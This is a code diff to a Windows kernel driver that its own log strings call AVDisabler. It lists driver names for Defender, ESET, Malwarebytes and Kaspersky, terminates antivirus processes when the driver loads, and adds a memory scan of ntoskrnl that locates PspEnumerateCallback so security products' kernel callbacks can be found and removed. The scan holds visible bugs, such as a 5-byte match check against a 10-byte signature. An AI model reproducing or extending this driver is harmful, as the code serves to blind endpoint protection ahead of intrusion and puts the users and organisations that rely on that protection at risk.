@@ -1,6 +1,7 @@
 
 #include <ntddk.h>
 //#include "CallbackRegistrations.h"
+#include <wdm.h>
 #include <Stdio.h>
 
 /*
@@ -149,7 +150,8 @@ typedef struct _SYSTEM_PROCESS_INFORMATION {
 #define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
 
 BYTE PspEnumerateCallbackOpcodes[] = { 0x4C, 0x8B, 0xCA, 0x85, 0xC9, 0x74, 0x35, 0x83, 0xE9, 0x01 }; // first 10 opcodes
-
+ULONG_PTR PspEnumerateCallbackBase = 0x0;
+ULONG ntoskrnlSize = 0;
 //TODO: Add an initial process termination functiona that will be called at the start of each process creation callback routine 
 //	on each UNICODE_STRING image related to the AV Vendor (Defender, ESET, Malwarebytes) etc...
 
@@ -271,7 +273,6 @@ UNICODE_STRING system_interceptors_metaDLL = RTL_CONSTANT_STRING(L"system_interc
 UNICODE_STRING mbae64SYS = RTL_CONSTANT_STRING(L"mbae64.sys");
 UNICODE_STRING mbamelamSYS = RTL_CONSTANT_STRING(L"mbamelam.sys");
 
-
 // Eset Drivers
 
 UNICODE_STRING eamonmSYS = RTL_CONSTANT_STRING(L"eamonm.sys");
@@ -305,6 +306,34 @@ BOOLEAN g_IsDefenderCallbackRoutineSet = FALSE;
 BOOLEAN g_IsEsetCallbackRoutineSet = FALSE;
 BOOLEAN g_IsMalwareBytesCallbackRoutineSet = FALSE;
 BOOLEAN g_IsKasperskyCallbackRoutineSet = FALSE;
+
+
+typedef struct _SYSTEM_MODULE {
+	PVOID  Reserved1;
+	PVOID  Reserved2;
+	PVOID  ImageBase;      // Base address of the module
+	ULONG  ImageSize;
+	ULONG  Flags;
+	USHORT LoadOrderIndex;
+	USHORT InitOrderIndex;
+	USHORT LoadCount;
+	USHORT ModuleNameOffset;
+	CHAR   ImageName[256]; // Full path of the module
+} SYSTEM_MODULE, * PSYSTEM_MODULE;
+
+typedef struct _SYSTEM_MODULE_INFORMATION {
+	ULONG ModuleCount;
+	SYSTEM_MODULE Modules[1];
+} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
+
+
+extern "C" NTSTATUS ZwQuerySystemInformation(
+	SYSTEM_INFORMATION_CLASS SystemInformationClass,
+	PVOID SystemInformation,
+	ULONG SystemInformationLength,
+	PULONG ReturnLength
+);
+
 
 NTSTATUS GetFileNameFromPath(IN UNICODE_STRING FullPath, OUT UNICODE_STRING* FileName)
 {
@@ -351,6 +380,36 @@ NTSTATUS GetFileNameFromPath(IN UNICODE_STRING FullPath, OUT UNICODE_STRING* Fil
 	}
 
 	return STATUS_SUCCESS;
+}
+
+PVOID GetNtoskrnlBaseAddress()
+{
+	NTSTATUS status;
+	ULONG bufferSize = 0;
+	PVOID ntBase = NULL;
+	PSYSTEM_MODULE_INFORMATION pModuleInfo = NULL;
+
+	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &bufferSize);
+	if (status != STATUS_INFO_LENGTH_MISMATCH)
+		return NULL;
+
+	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, bufferSize, NULL);
+	if (!pModuleInfo)
+		return NULL;
+
+	status = ZwQuerySystemInformation(SystemModuleInformation, pModuleInfo, bufferSize, &bufferSize);
+	if (!NT_SUCCESS(status))
+	{
+		ExFreePoolWithTag(pModuleInfo, NULL);
+		return NULL;
+	}
+
+	ntBase = pModuleInfo->Modules[0].ImageBase;
+	ntoskrnlSize = pModuleInfo->Modules[0].ImageSize;
+
+	ExFreePoolWithTag(pModuleInfo, NULL);
+
+	return ntBase;
 }
 
 //NTSTATUS GetAVPIDs(DWORD32 IOCTL)
@@ -516,15 +575,51 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 	}
 }
 
-VOID GetPspEnumerateCallbackBaseAddress(ULONG_PTR* PspEnumerateCallbackBaseAddress)
+ULONG_PTR GetPspEnumerateCallbackBaseAddress()
 {
+
 	/*
 		Need here to implement a function that reads the whole content of ntoskrnl.exe into a memory buffer
 		Then, compare every 10 opcodes with the PspEnumerateCallback opcodes, whenever there is a match,
-		return the base address/offset from base address into PspEnumerateCallbackBaseAddress
+		return the base address/offset from base address into nt!PspEnumerateCallbackBaseAddress
 	*/
 
-	return;
+	NTSTATUS status = STATUS_SUCCESS;
+	PVOID NtBaseAddress = GetNtoskrnlBaseAddress();
+	KdPrint(("ntoskrnl.exe base address: 0x%p\n", NtBaseAddress));
+
+	HANDLE hFile = 0;
+	OBJECT_ATTRIBUTES ObjAttr;
+	IO_STATUS_BLOCK IoStatus;
+
+	BOOLEAN WasFound = FALSE;
+	for(int i = 0; i < ntoskrnlSize; i++)
+	{
+		BYTE CurrentChar = *(CHAR*)((CHAR*)NtBaseAddress+i);
+
+		if(CurrentChar == PspEnumerateCallbackOpcodes[0])
+		{
+			int internal_counter = 0;
+			for(int j = i; j < i + 10; j++)
+			{
+				if(PspEnumerateCallbackOpcodes[internal_counter] != *(CHAR*)((CHAR*)NtBaseAddress + j))
+				{
+					break;
+				}
+
+				internal_counter++;
+			}
+			if(internal_counter == 5)
+			{
+				WasFound = TRUE;
+				KdPrint(("PspEnumerateCallback() at: 0x%p\n", (ULONG_PTR)((ULONG_PTR)NtBaseAddress + i)));
+				return (ULONG_PTR)((ULONG_PTR)NtBaseAddress + i);
+			}
+		}
+	}
+		
+
+	return 0;
 }
 
 NTSTATUS TerminateCallbackRoutines(ULONG_PTR* PspCreateProcessCallbackRoutinesArray,
@@ -614,16 +709,21 @@ NTSTATUS EnumerateAVCallbackRoutinesBaseAddress(ULONG_PTR* PspCreateProcessNotif
 		DWORD32* PCallbackIndex,
 		ULONG_PTR* TargetRoutineBaseAddress);
 
-	UNICODE_STRING PspEnumerateCallbackName = RTL_CONSTANT_STRING(L"PspEnumerateCallback");
-	UNICODE_STRING ExAllocatePoolName = RTL_CONSTANT_STRING(L"ExAllocatePool");
+	//UNICODE_STRING PspEnumerateCallbackName = RTL_CONSTANT_STRING(L"PspEnumerateCallback");
+	//UNICODE_STRING ExAllocatePoolName = RTL_CONSTANT_STRING(L"ExAllocatePool");
+	//
+	//ULONG_PTR ExAllocatePoolAddress = (ULONG_PTR)MmGetSystemRoutineAddress(&ExAllocatePoolName);
+	//KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: ExAllocatePool: 0x%p\n", ExAllocatePoolAddress));
+	//
+	//PVOID NtosKernelBaseAddress = (PVOID)(ExAllocatePoolAddress - 0x3F46C0);
+	//KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: ntoskrnl.exe base address: 0x%p\n", NtosKernelBaseAddress));
+	//
+	//pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)((ULONG_PTR)NtosKernelBaseAddress + 0xA3F930);
 
-	ULONG_PTR ExAllocatePoolAddress = (ULONG_PTR)MmGetSystemRoutineAddress(&ExAllocatePoolName);
-	KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: ExAllocatePool: 0x%p\n", ExAllocatePoolAddress));
+	if(!GetPspEnumerateCallbackBaseAddress())
+		return STATUS_INVALID_ADDRESS;
 
-	PVOID NtosKernelBaseAddress = (PVOID)(ExAllocatePoolAddress - 0x3F46C0);
-	KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: ntoskrnl.exe base address: 0x%p\n", NtosKernelBaseAddress));
-
-	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)((ULONG_PTR)NtosKernelBaseAddress + 0xA3F930);
+	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)(GetPspEnumerateCallbackBaseAddress());
 	if (!PspEnumerateCallback)
 	{
 		KdPrint(("[-] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: Couldn't resolve PspEnumerateCallback address\n"));
@@ -1277,6 +1377,7 @@ VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
 	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));
 }
 
+
 extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 {
 	UNREFERENCED_PARAMETER(RegistryPath);
@@ -1306,6 +1407,9 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 	GetAVPIDs();
 	TerminateAVProcesses();
 	KdPrint(("\n"));
+
+	ULONG_PTR Pointer = GetPspEnumerateCallbackBaseAddress();
+	KdPrint(("DriverEntry: PspEnumerateCallback Base address: 0x%p\n", Pointer));
 
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
 	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatchRoutine;
